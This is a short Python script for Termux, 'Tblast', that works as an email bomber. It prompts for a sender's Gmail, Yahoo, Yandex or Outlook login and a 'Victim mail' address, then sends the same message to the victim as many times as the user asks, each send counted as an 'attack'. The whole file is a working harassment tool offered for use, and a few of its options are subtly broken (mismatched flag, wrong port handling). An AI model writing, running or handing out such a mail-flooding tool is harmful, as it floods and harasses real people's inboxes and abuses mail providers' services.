#!/data/data/com.termux/files/usr/bin/python3
#Prince kumar
#Date 24 aug 2021
#All import goes here
import smtplib
import sys
import getpass
import os 
#Make a banner....
try:
    if(sys.platform == "linux"):
        os.system("clear")
    else:
        os.system('cls')
except KeyboardInterrupt:
    print("\033[31;1m Exiting Tblast ✂️")
    sys.exit()
#Make a function for help
def help():
    print(" How to use this tool 🤔")
    print("\033[33;1m ")
    print("   Tblast -options eg: 👇")
    print("   Tbalst -h for help")
    print("   Tbalst -g for Gmail")
    print("   Tbalst -o for Yahoo mail")
    print("   Tbalst -y for Yendexmail")
    print("   Tbalst -ha for Hotmail")
#Make a banner For this tool
def banner():
    print('''\033[32;1m
                  ,--.!,
               __/   -*-
             ,d08b.  '|`
             0088MM     
             `9MMP' |\033[31;1m MADE BY PRINCE''')
banner()
#Create a class for the sending mail
class s_mail:
    def __init__(self,S_mail,S_pass,rec):
        self.S_mail = S_mail
        self.S_pass = S_pass
        self.rec = rec
    def login_e(self,server,port,noa,msg):
        T_log = smtplib.SMTP(server,port)
        T_log.ehlo()
        T_log.starttls()
        T_log.ehlo()
        try:
            T_log.login(self.S_mail,self.S_pass)
        except:
            print("\033[31;1m Login failed 👿")
        for i in range(noa):
            T_log.sendmail(self.S_mail,self.rec,f"{msg}")
            print(f"\033[32;1m {i+1} Mail sent 📫")
        T_log.close()

#Handel the user argument
try:
    if(sys.argv[1] == "-h"):
        help()
    elif(sys.argv[1] == "-g"):
        sender = input("\033[36;1m Sender mail: ")
        passd = getpass.getpass("\033[36;1m Password: ")
        rec = input("\033[36;1m Victim mail: ")
        noa = int(input("\033[33;1m No of attack: "))
        mail = s_mail(sender,passd,rec)
        msg = input("\033[0;1m Massage: ")
        mail.login_e('smtp.gmail.com',587,noa,msg)
    elif(sys.argv[1] == "-o"):
        sender = input("\033[36;1m Sender mail: ")
        passd = getpass.getpass("\033[36;1m Password: ")
        rec = input("\033[36;1m Victim mail: ")
        noa = int(input("\033[33;1m No of attack: "))
        mail = s_mail(sender,passd,rec)
        msg = input("\033[0;1m Massage: ")
        mail.login_e('smtp.mail.yahoo.com',465,noa,msg)
    elif(sys.argv[1] == "-y"):
        sender = input("\033[36;1m Sender mail: ")
        passd = getpass.getpass("\033[36;1m Password: ")
        rec = input("\033[36;1m Victim mail: ")
        noa = int(input("\033[33;1m No of attack: "))
        mail = s_mail(sender,passd,rec)
        msg = input("\033[0;1m Massage: ")
        mail.login_e('smtp.yandex.com',465,noa,msg)
    elif(sys.argv[1] == "-hm"):
        sender = input("\033[36;1m Sender mail: ")
        passd = getpass.getpass("\033[36;1m Password: ")
        rec = input("\033[36;1m Victim mail: ")
        noa = int(input("\033[33;1m No of attack: "))
        mail = s_mail(sender,passd,rec)
        msg = input("\033[0;1m Massage: ")
        mail.login_e('smtp-mail.outlook.com',587,noa,msg)
    else:
        print("\033[39;1m This service is not available")

except IndexError:
    help()
